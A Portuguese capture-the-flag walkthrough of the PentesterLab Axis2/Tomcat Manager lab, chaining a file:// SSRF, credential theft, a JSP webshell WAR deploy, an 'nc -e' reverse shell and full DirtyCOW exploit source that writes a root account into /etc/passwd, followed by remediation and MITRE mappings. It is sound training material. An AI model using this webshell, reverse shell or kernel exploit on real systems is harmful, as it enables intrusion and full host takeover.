# VulnHub Axis2 e Tomcat Manager — SSRF até Root via DirtyCOW

Bora rapaziada!! Essa VM tem tudo: um web service Java com SSRF de leitura de arquivo, deploy de WAR via Tomcat Manager para RCE, e então o lendário DirtyCOW (CVE-2016-5195) para fazer uma race condition e virar root. Top demais como exercício do PentesterLab, que cobre três primitivas de ataque completamente diferentes numa única cadeia. Se você quer entender por que expor serviços internos importa, essa VM entregou tudo.

Valeu ao PentesterLab por esse exercício. É um case perfeito de falha em profundidade de defesa, onde cada camada individualmente parece "ok" até você encadear tudo.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário / Médio |
| **VM Alvo** | Axis2 and Tomcat Manager (PentesterLab) |
| **VM do Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://pentesterlab.com/exercises/axis2-and-tomcat-manager |
| **Técnicas** | SSRF via URI file://, coleta de credenciais, deploy de WAR no Tomcat, JSP webshell, exploit de kernel DirtyCOW |
| **CVEs** | CVE-2010-0219 (credenciais padrão Apache Axis2), CVE-2016-5195 (escalação de privilégios DirtyCOW) |
| **Grupos APT** | APT41 (exploração de web service Java + deploy WAR), Lazarus Group (exploit de kernel para privesc), APT28 (SSRF para coleta interna de credenciais) |

> **CISA KEV:** CVE-2016-5195 (DirtyCOW) está listado no catálogo CISA Known Exploited Vulnerabilities.

---

## Resumo do Ataque

```
[descoberta de host: nmap -sn]
    |
    v
[nmap: 22/tcp SSH | 80/tcp Apache + mod_jk]
    |
    v
[enumerar Axis2 em /axis2/ => ProxyService SSRF descoberto]
    |
    v
[SSRF: file:///etc/tomcat6/tomcat-users.xml => manager:!mp0ss!bl32gu355]
    |
    v
[construir WAR com JSP webshell => deploy via Tomcat Manager]
    |
    v
[RCE como tomcat6 (uid=103)]
    |
    v
[reverse shell via nc -e]
    |
    v
[uname -r: 2.6.32 => DirtyCOW CVE-2016-5195]
    |
    v
[race condition sobrescreve /etc/passwd => firefart:firefart (uid=0)]
    |
    v
[SSH como firefart => ROOT]
```

---

## Metodologia

1. Descoberta de host e varredura de portas com Nmap
2. Enumeração de serviços: descobrir Apache + mod_jk + Axis2
3. SSRF no Axis2 ProxyService via URI `file://`
4. Coletar credenciais do Tomcat Manager em `tomcat-users.xml`
5. Construir e implantar WAR malicioso com JSP webshell via Tomcat Manager
6. Obter reverse shell como `tomcat6`
7. Verificar versão do kernel: identificar faixa vulnerável ao DirtyCOW
8. Compilar e executar exploit DirtyCOW para sobrescrever `/etc/passwd`
9. SSH como usuário root injetado (`firefart`), capturar prova

---

## Passo 1 — Identificando o Alvo

```bash
# Descoberta de host na rede host-only
nmap -sn 192.168.56.0/24
```

Alvo: **192.168.56.104** (host Debian)

```bash
# Varredura detalhada de portas
nmap -sV -p 22,80,8005,8009 192.168.56.104
```

Saída esperada:

```
22/tcp   open  ssh     OpenSSH (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.16 (Debian)
8005/tcp filtered  (Tomcat shutdown - somente loopback)
8009/tcp filtered  (Tomcat AJP - somente loopback)
```

Porta 80 é Apache com `mod_jk` roteando para Tomcat 6 via AJP na 8009. O Tomcat em si não é acessível diretamente de fora, mas as requisições ao Apache são repassadas. Essa configuração `mod_jk` é a chave: todos os caminhos do Tomcat ficam acessíveis pela porta 80.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Passo 2 — Enumerando o Serviço Axis2

```bash
# Descobrir Axis2
curl -s http://192.168.56.104/ | grep -i axis

# Listar serviços disponíveis
curl -s "http://192.168.56.104/axis2/services/listServices"
```

Saída esperada (parte relevante):

```xml
<serviceGroup name="ProxyService">
  <service name="ProxyService">
    <operation name="get"/>
  </service>
</serviceGroup>
```

```bash
# Inspecionar o WSDL para entender os parâmetros da operação get
curl -s "http://192.168.56.104/axis2/services/ProxyService?wsdl" | grep -E 'get|uri'
```

A operação `get` aceita um parâmetro string `uri` e faz proxy da requisição, incluindo URIs `file://`. Isso significa leitura arbitrária de arquivo local. Ixi.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Passo 3 — SSRF: Confirmar Leitura de Arquivo

> **O que é SSRF?** Server-Side Request Forgery engana o servidor para fazer requisições em nome do atacante. Quando um serviço faz proxy de URIs arbitrárias sem validação de esquema, um atacante pode usar `file://` para ler arquivos locais, `http://169.254.169.254/` para acessar metadados de nuvem, ou endereços RFC-1918 internos para pivotar em redes internas. Mapeia para CWE-918 e OWASP A10:2021.

```bash
# Confirmar leitura arbitrária de arquivo via URI file://
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/passwd"
```

Saída esperada: conteúdo completo do `/etc/passwd`. Leitura de arquivo confirmada.

> **Nota do mundo real:** As credenciais padrão do Apache Axis2 (CVE-2010-0219) e SSRF em serviços proxy foram exploradas pelo APT41 e FIN7 para pivotar de serviços Java expostos na DMZ para redes internas. A cadeia SSRF para arquivo de credenciais está documentada em múltiplos relatórios de red team. Referência: CVE-2010-0219.

> **MITRE ATT&CK:** TA0009 Collection | T1005 Data from Local System | T1213 Data from Information Repositories

---

## Passo 4 — SSRF: Coletar Credenciais do Tomcat Manager

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml"
```

Saída esperada:

```xml
<tomcat-users>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="manager" password="!mp0ss!bl32gu355" roles="tomcat,manager-gui"/>
</tomcat-users>
```

Credenciais: **`manager:!mp0ss!bl32gu355`** com role `manager-gui`. Boa demais, mano.

Bônus: pegue as credenciais de admin do Axis2 também:

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml"
# Retorna: admin:axis2
```

> **MITRE ATT&CK:** TA0006 Credential Access | T1552.001 Credentials in Files

---

## Passo 5 — Construir o WAR com JSP Webshell

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/axshell.war .
```

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Server Software Component: Web Shell

---

## Passo 6 — Deploy do WAR via Tomcat Manager

Extraia o token CSRF necessário pelo formulário de upload do Tomcat Manager:

```bash
CSRF=$(curl -s -u "manager:!mp0ss!bl32gu355" \
  "http://192.168.56.104/manager/html" \
  -c /tmp/axis_cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "CSRF token: $CSRF"
```

Faça o deploy do WAR:

```bash
curl -s -u "manager:!mp0ss!bl32gu355" \
  -b /tmp/axis_cookies.txt \
  "http://192.168.56.104/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/axshell.war;type=application/octet-stream" | grep -i "OK\|deployed"
```

Confirme RCE:

```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Saída esperada:

```
uid=103(tomcat6) gid=106(tomcat6) groups=106(tomcat6)
```

RCE confirmado como `tomcat6`. Vacilou!

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application

---

## Passo 7 — Reverse Shell

Na máquina atacante:

```bash
nc -lvnp 4445
```

Acione o shell (o `nc` do Debian 6 suporta `-e`):

```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=nc -e /bin/bash 192.168.56.1 4445"
```

Shell interativo como `tomcat6 (uid=103)`.

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Passo 8 — Versão do Kernel e Identificação do DirtyCOW

```bash
uname -r
# Linux debian 2.6.32-5-amd64
```

O kernel 2.6.32 está na faixa vulnerável ao DirtyCOW: **2.6.22 a 4.8.3**.

> **O que é DirtyCOW (CVE-2016-5195)?** Uma race condition na implementação copy-on-write (COW) do kernel Linux permite que um processo sem privilégios escreva em mapeamentos de memória somente-leitura. Duas threads disputam: uma chama `madvise(MADV_DONTNEED)` num mapeamento privado somente-leitura de um arquivo, enquanto a outra escreve em `/proc/self/mem` no mesmo offset. A corrida vence e escreve diretamente na página física subjacente, contornando o COW. Isso permite que qualquer usuário sem privilégios sobrescreva arquivos que pode ler, incluindo `/etc/passwd`. CVE-2016-5195, CVSS 7.8, está no catálogo CISA KEV.

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1068 Exploitation for Privilege Escalation

---

## Passo 9 — Compilar e Executar o DirtyCOW

**Na máquina atacante**, compile um binário estaticamente linkado (estático é obrigatório porque a glibc do alvo é antiga):

```bash
cat > /tmp/dc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map; int f; struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 200000000; i++)
        c += madvise(map, 100, MADV_DONTNEED);
    printf("madvise %d\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR), i, c = 0;
    for (i = 0; i < 200000000; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n", c);
    return NULL;
}

int main() {
    char *payload = "firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash\n";
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    pthread_t pth1, pth2;
    pthread_create(&pth1, NULL, madviseThread, payload);
    pthread_create(&pth2, NULL, procselfmemThread, payload);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF

gcc -static -o /tmp/dc /tmp/dc.c -lpthread
```

Faça backup do `/etc/passwd` no alvo antes de executar:

```bash
cp /etc/passwd /tmp/passwd.bak
```

Transfira e execute:

```bash
# No atacante: servir o binário
python3 -m http.server 8888 --directory /tmp &

# No alvo (shell tomcat6):
wget http://192.168.56.1:8888/dc -O /tmp/dc && chmod +x /tmp/dc
/tmp/dc > /tmp/dc_out.txt 2>&1 &
```

Aguarde ~30 segundos, depois verifique:

```bash
head -1 /etc/passwd
# firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash
```

---

## Passo 10 — Acesso Root via SSH

```bash
sshpass -p firefart ssh \
  -o StrictHostKeyChecking=no \
  -o HostKeyAlgorithms=ssh-rsa \
  firefart@192.168.56.104 \
  "id && hostname && uname -r"
```

Saída esperada:

```
uid=0(firefart) gid=0(root) groups=0(root)
debian
2.6.32-5-amd64
```

**(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Root conquistado!! Essa race condition do DirtyCOW reescreveu o jogo!!**

Limpeza: restaure o `/etc/passwd` ao terminar:

```bash
sshpass -p firefart ssh -o HostKeyAlgorithms=ssh-rsa firefart@192.168.56.104 \
  "cp /tmp/passwd.bak /etc/passwd"
```

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|----------------|
| Credencial | `manager:!mp0ss!bl32gu355` | /etc/tomcat6/tomcat-users.xml via SSRF | Deploy WAR no Tomcat Manager |
| Credencial | `admin:axis2` | axis2.xml via SSRF | Painel admin Axis2 |
| Root injetado | `firefart:firefart` (hash DES: fik57D3GJz/tk) | /etc/passwd sobrescrito via DirtyCOW | Acesso SSH root |
| Prova de root | `uid=0(firefart) gid=0(root) groups=0(root)` | Sessão SSH | Root confirmado |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | SSRF no Axis2 ProxyService via URI `file://` | SSRF em ambientes de nuvem pode acessar endpoints de metadados (169.254.169.254) ou bancos internos | Restrinja esquemas de URI permitidos; bloqueie `file://`, `ftp://` e faixas RFC-1918 internas |
| 2 | Credenciais do Tomcat Manager em `tomcat-users.xml` legíveis via SSRF | Arquivos de config com credenciais em texto simples são alvo prioritário no recon interno | Restrinja `tomcat-users.xml` a permissão 640 para `tomcat6:tomcat6`; nunca exponha o Manager externamente |
| 3 | Tomcat Manager exposto externamente via mod_jk | Acesso ao Manager pela internet levou a incidentes de alto perfil | Restrinja por IP ou remova completamente `/manager/` e `/host-manager/` no `context.xml` |
| 4 | DirtyCOW (CVE-2016-5195) em kernel 2.6.32 sem patch | DirtyCOW foi amplamente explorado por grupos de ransomware e APTs após a divulgação | Atualize kernels; aplique virtual patching via políticas LSM (SELinux/AppArmor) |
| 5 | Compilação estática de binário para contornar glibc antiga | Atacantes pré-compilam exploits para versões conhecidas de SO alvo em máquinas controladas | Monitore uploads incomuns de binários em `/tmp`; restrinja execução em diretórios com escrita global |

**Por que isso importa fora do lab?**

Essa cadeia replica incidentes reais. O vetor de deploy de WAR via Tomcat Manager foi usado em múltiplas violações para obter RCE inicial em ambientes corporativos (MegaCortex, várias cadeias de desserialização Java). O DirtyCOW (CVE-2016-5195) foi ativamente explorado após a divulgação e permanece no catálogo CISA KEV, o que significa que sistemas sem patch em governo e infraestrutura crítica ainda estão em risco. O APT41 está documentado usando exploração de serviço Java mais privesc via exploit de kernel como parte de sua metodologia de intrusão.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Reconhecimento | TA0043 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Acesso a Credenciais | TA0006 | Credentials in Files | T1552.001 |
| Execução | TA0002 | Server Software Component: Web Shell | T1505.003 |
| Execução | TA0002 | Unix Shell | T1059.004 |
| Persistência | TA0003 | Create Account: Local Account | T1136.001 |
| Escalação de Privilégios | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Evasão de Defesa | TA0005 | Modify Authentication Process | T1556 |
| Movimento Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Coleta | TA0009 | Data from Local System (arquivos de credencial) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Restrinja o Axis2 ProxyService a esquemas URI permitidos (`http://`, `https://` apenas); bloqueie `file://`, `ftp://` e endereços RFC-1918.
2. Troque as credenciais padrão do Tomcat Manager imediatamente após o deploy.
3. Restrinja `/manager/` e `/host-manager/` por IP para loopback ou endereços somente de VPN no `context.xml`.
4. Configure permissões do `tomcat-users.xml` para `tomcat6:tomcat6 640` (dono leitura/escrita, grupo leitura, nenhuma permissão global).
5. Atualize o kernel para pelo menos 4.8.3 para corrigir o DirtyCOW; aplique virtual patching via política SELinux/AppArmor enquanto isso.
6. Monitore `/tmp` e diretórios com escrita global para escritas de arquivo executável.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Bloqueie acesso externo ao `/manager/` no firewall ou load balancer.
- Rotacione todas as credenciais do Tomcat e Axis2.
- Audite processos em execução e WARs implantados em busca de aplicações não autorizadas.
- Se exploit de kernel suspeito: isole o host; considere resposta ao vivo e forense de memória.

**Contramedidas MITRE D3FEND:**
- D3-NI Network Isolation para interromper movimento lateral do host Tomcat comprometido (T1021.004)
- D3-PA Process Allow Listing para impedir execução não autorizada de WAR (T1505.003)
- D3-FAPA File Access Pattern Analysis para detectar leituras de `tomcat-users.xml` via SSRF (T1552.001)
- D3-EAL Executable Allow Listing em `/tmp` para bloquear execução do binário DirtyCOW (T1068)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.RA): Avaliação de risco deve incluir superfície de ataque SSRF em middleware Java.
- Protect (PR.AC-3): Gerenciamento de acesso remoto; restrinja o Tomcat Manager a redes administrativas.
- Protect (PR.DS-1): Proteja arquivos de credenciais com permissões de menor privilégio.
- Detect (DE.CM-1): Monitore deploys não autorizados de WAR e requisições incomuns ao Axis2.
- Respond (RS.MI-1): Mitigação de incidente: bloqueie acesso externo ao Tomcat Manager ao detectar.
- Recover (RC.RP-1): Restaure o sistema a partir de backup limpo após exploração do DirtyCOW.

**NIST SP 800-53 Rev. 5:**
- AC-3: Access Enforcement (restrinja a UI do Manager a faixas de IP autorizadas)
- AC-6: Least Privilege (conta de serviço Axis2 não deve ler todos os arquivos locais)
- SI-2: Flaw Remediation (corrigir kernel CVE-2016-5195)
- CM-6: Configuration Settings (hardening do deploy do Tomcat Manager)
- SC-7: Boundary Protection (restringir caminhos proxiados pelo mod_jk)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): listado no catálogo CISA KEV. Agências federais obrigadas a remediar.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: THREAT (Threat and Vulnerability Management)
- Prática: Manage Vulnerabilities
- MIL Alvo: MIL-2 (aplicação de patches dentro do SLA definido com base na severidade CVSS)

---

## Considerações Finais

Valeu ao PentesterLab por esse exercício. É uma das cadeias multi-estágio mais elegantes que você vai encontrar num boot2root: SSRF para coleta de credenciais, deploy WAR para RCE, e um exploit de kernel clássico para privesc. Cada etapa ensina algo independentemente valioso, e juntas elas mostram exatamente por que um único serviço proxy mal configurado pode ser o ponto de entrada para comprometimento total do host.

O DirtyCOW em particular vale a pena entender a fundo: não é só um truque de CTF, mas uma vulnerabilidade real que foi ativamente explorada após a divulgação e permanece como ponto de referência para exploração de race condition no kernel Linux.

Se esse walkthrough te ajudou, compartilha com a galera e continua hackando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
